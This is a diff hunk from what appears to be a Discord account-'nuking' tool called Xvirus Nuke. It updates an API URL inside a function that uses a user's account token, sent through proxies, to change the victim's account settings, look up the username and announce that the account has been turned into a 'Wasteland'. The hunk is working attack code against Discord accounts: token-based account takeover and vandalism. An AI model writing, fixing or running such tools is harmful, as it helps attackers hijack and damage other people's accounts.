@@ -85,7 +85,7 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
           'status': "idle"
     }
     requests.patch("https://discord.com/api/v10/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
-    j = requests.get("https://discordapp.com/api/v10/users/@me", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
+    j = requests.get("https://discord.com/api/v10/users/@me", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
     a = j['username'] + "#" + j['discriminator']
     setTitle(f"Xvirus Nuke Successfully Detonated!")
     print_slow(f"{Fore.GREEN}Succesfully turned {a} into a Xeme Wasteland ")
